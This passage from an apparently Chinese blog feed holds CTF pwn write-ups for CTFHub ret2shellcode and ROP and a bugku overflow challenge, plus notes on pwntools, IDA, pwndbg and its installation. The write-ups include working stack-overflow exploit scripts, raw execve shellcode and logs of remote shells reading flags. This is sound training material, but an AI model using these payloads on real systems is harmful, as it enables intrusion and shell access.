class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&#x27;debug&#x27;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-comment"># io = process(&#x27;ret2shellcode&#x27;)</span><br>io = remote(<span class="hljs-string">&quot;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&quot;</span>, <span class="hljs-number">25197</span>) <br><br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br><br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br><br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;fuckpwn!&#x27;</span> + p64(shellcode_address) + shellcode<br><br>io.recv()<br>io.sendline(payload)<br>io.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp3.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">[+] buf_address =&gt; 0X7FFC5FC266B0</span><br><span class="hljs-string">[+] buf_address =&gt; 0X7FFC5FC266D0</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flaf</span><br><span class="hljs-string">cat: flaf: No such file or directory</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat g</span><br><span class="hljs-string">cat: g: No such file or directory</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Interrupted</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="exp4-1"><a href="#exp4-1" class="headerlink" title="exp4"></a>exp4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>host = <span class="hljs-string">&#x27;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&#x27;</span><br>port = <span class="hljs-number">25197</span><br>p = connect(host,port)<br><br>p.recvuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>buf_addr = p.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>, drop=<span class="hljs-literal">True</span>) <span class="hljs-comment"># 获取buf地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Input someting : &#x27;</span>) <span class="hljs-comment"># 执行直到出现这句话</span><br>shell=<span class="hljs-string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + p64(<span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>)+<span class="hljs-number">32</span>) + shell<br><br>p.sendline(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp4.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">buf_addr: b&#x27;0x7fff875469b0&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Interrupted</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ROP]<span class="hljs-comment"># ./pwn</span><br>Welcome to CTFHub rop.Input someting:<br><br>1234567890<br>[root@ningan ROP]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfhub/ROP/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>[root@ningan ROP]<span class="hljs-comment"># file pwn</span><br>pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=f5d131f24a3b86fc859f2cfade17eb92888ff738, not stripped<br></code></pre></td></tr></table></figure><h2 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">vulnerable_function</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[64]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-40h] BYREF</span><br><br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x200uLL);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="！！！重点！！！-1"><a href="#！！！重点！！！-1" class="headerlink" title="！！！重点！！！"></a>！！！重点！！！</h2><p>这道题是 没有 sytem函数 和 bin&#x2F;sh 来供我们利用的    rop_x64,泄露libc</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】pwn exp常用函数解析</title>
    <link href="/2023/08/18/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%20exp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/08/18/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%20exp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br></code></pre></td></tr></table></figure><p>sendlineafter  当收到第一个参数之后，就发送第二个参数+&#x2F;n输出</p><h2 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h2><p>是用来填充垃圾数据的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt;&gt; from pwn import *<br>&gt;&gt;&gt;<br>&gt;&gt;&gt; cyclic(60)<br>b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa&#x27;</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt; cyclic(0x16 + 8)<br>b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaaha&#x27;</span><br>&gt;&gt;&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *         <span class="hljs-comment"># 用于创建与二进制文件进行交互的脚本。它提供了许多用于漏洞利用的功能。 </span><br>p=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)  <span class="hljs-comment"># 这创建了一个新的进程，执行名为 `ret2libc3` 的可执行文件。这通常用于在本地系统上调试和测试漏洞利用脚本。</span><br>elf=ELF(<span class="hljs-string">&#x27;ret2libc3&#x27;</span>)      <span class="hljs-comment"># 这将二进制文件 `ret2libc3` 加载到一个对象 `elf` 中，以便可以从中获取有关二进制文件的信息，例如函数地址、GOT（Global Offset Table）等。</span><br>put_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]   <span class="hljs-comment"># 获取了在二进制文件的 PLT 表中 `puts` 函数的地址。</span><br>put_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf工具系列】pwndbg</title>
    <link href="/2023/08/17/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91ida%E3%80%81pwndbg%E3%80%81one_gadget/"/>
    <url>/2023/08/17/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91ida%E3%80%81pwndbg%E3%80%81one_gadget/</url>
    
    <content type="html"><![CDATA[<h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p>下面两个视图的切换，按下空格键就可以</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817193929.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817193947.png" alt="image.png"></p><p>有LOAD的表示程序装入内存的控制信息</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817194116.png" alt="image.png"></p><p>plt在代码段<br>每个表项都是16字节  例如下面的： xxx26-&gt;xxx36</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817194259.png" alt="image.png"></p><p>got在数据段<br>got.plt在数据段   </p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817194717.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817232404.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817233207.png" alt="image.png"></p><p>shift+F12    找到字符串   双击</p><p>点函数，输入n，进行重命名</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822215158.png" alt="image.png"></p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>gdb常用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb <span class="hljs-built_in">link</span><br>n<br>info b<br>d 1           <span class="hljs-comment"># 删除断点</span><br>b *0xxxxx<br>b 函数名<br>c             <span class="hljs-comment"># continue</span><br>plt<br>got<br>backtrace<br><span class="hljs-built_in">return</span>    <span class="hljs-comment"># 把这个库函数退出</span><br><br>fastbin<br><br>pwndbg&gt; distance 源地址 目的地址<br>pwndbg&gt; p/d 0x6c<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817195008.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817195211.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disass 地址<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817195329.png" alt="image.png"></p><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>一个gadget就能完成攻击的目的<br>对程序的环境和依赖要求比较高</p><h2 id="———————"><a href="#———————" class="headerlink" title="———————-"></a>———————-</h2><h2 id="查看两个地址的距离"><a href="#查看两个地址的距离" class="headerlink" title="查看两个地址的距离"></a>查看两个地址的距离</h2><h3 id="gdb方法"><a href="#gdb方法" class="headerlink" title="gdb方法"></a>gdb方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; distance 0x7fffffffe140 0x7fffffffe1b0<br>0x7fffffffe140-&gt;0x7fffffffe1b0 is 0x70 bytes (0xe words)<br></code></pre></td></tr></table></figure><h3 id="python方法"><a href="#python方法" class="headerlink" title="python方法"></a>python方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2text]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; 0x7fffffffe1b0 - 0x7fffffffe140<br>112<br>&gt;&gt;&gt;<br><br></code></pre></td></tr></table></figure><h2 id="找字符串的地址"><a href="#找字符串的地址" class="headerlink" title="找字符串的地址"></a>找字符串的地址</h2><h3 id="方法1：ROPgadget"><a href="#方法1：ROPgadget" class="headerlink" title="方法1：ROPgadget"></a>方法1：ROPgadget</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令: ROPgadget --binary 文件名 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>命令: ROPgadget --binary 文件名 --string <span class="hljs-string">&#x27;/sh&#x27;</span><br>命令: ROPgadget --binary 文件名 --string <span class="hljs-string">&#x27;sh&#x27;</span><br>命令: ROPgadget --binary 文件名 --string <span class="hljs-string">&#x27;cat flag&#x27;</span><br>命令: ROPgadget --binary 文件名 --string <span class="hljs-string">&#x27;cat flag.txt&#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="方法2：python"><a href="#方法2：python" class="headerlink" title="方法2：python"></a>方法2：python</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816221033.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816221522.png" alt="image.png"></p><h3 id="方法3：ida"><a href="#方法3：ida" class="headerlink" title="方法3：ida"></a>方法3：ida</h3><p>ida  shift+F12 跳到字符串</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】bugku pwn类型</title>
    <link href="/2023/08/16/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91bugku%20pwn%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/16/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91bugku%20pwn%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h1><h2 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 01-overflow]<span class="hljs-comment"># checksec pwn2</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/bugku/01-overflow/pwn2&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br>[root@ningan 01-overflow]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;say something?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;oh,that&#x27;s so boring!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821143154.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821143106.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_shell_</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tql~tql~tql~tql~tql~tql~tql&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is your flag!&quot;</span>);<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ida分析：查看函数地址"><a href="#ida分析：查看函数地址" class="headerlink" title="ida分析：查看函数地址"></a>ida分析：查看函数地址</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816232005.png" alt="image.png"></p><h2 id="gdb分析：查看偏移"><a href="#gdb分析：查看偏移" class="headerlink" title="gdb分析：查看偏移"></a>gdb分析：查看偏移</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816232100.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816232126.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 01-overflow]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; 0x1a0 - 0x170<br>48<br><br><br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">[root@ningan 01-overflow]<span class="hljs-comment"># cat exp.py</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process(&quot;./pwn2&quot;)</span><br>io = remote(<span class="hljs-string">&quot;114.67.175.224&quot;</span>, <span class="hljs-number">18554</span>)<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">48</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span> + p64(<span class="hljs-number">0x0000000000400751</span>)<br><br>io.recvline()<br><span class="hljs-comment"># io.recvline()</span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 01-overflow]<span class="hljs-comment"># python exp.py</span><br>[+] Opening connection to 114.67.175.224 on port 18554: Done<br>[*] Switching to interactive mode<br>oh,that<span class="hljs-string">&#x27;s so boring!</span><br><span class="hljs-string">tql~tql~tql~tql~tql~tql~tql</span><br><span class="hljs-string">this is your flag!</span><br><span class="hljs-string">flag&#123;99kls08s6d5a73bcd&#125;</span><br><span class="hljs-string">[*] Got EOF while reading in interactive</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Closed connection to 114.67.175.224 port 18554</span><br><span class="hljs-string">[*] Got EOF while sending in interactive</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf工具系列】pwndbg安装</title>
    <link href="/2023/08/16/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91pwndbg%E5%AE%89%E8%A3%85/"/>
    <url>/2023/08/16/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91pwndbg%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>sudo <span class="hljs-comment">#./setup.sh</span><br></code></pre></td></tr></table></figure><p>在ubuntu18.04上死活装不上，在kali上直接就装上了<br>感觉是因为ubuntu18.04上面的一些安装包有冲突，而kali的环境比较干净</p><p>kali的系统参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/pwndbg]<br>└─<span class="hljs-comment"># uname -a</span><br>Linux kali 6.3.0-kali1-amd64 <span class="hljs-comment">#1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux</span><br><br>┌──(root㉿kali)-[~/pwndbg]<br>└─<span class="hljs-comment"># cat /etc/os-release</span><br>PRETTY_NAME=<span class="hljs-string">&quot;Kali GNU/Linux Rolling&quot;</span><br>NAME=<span class="hljs-string">&quot;Kali GNU/Linux&quot;</span><br>VERSION_ID=<span 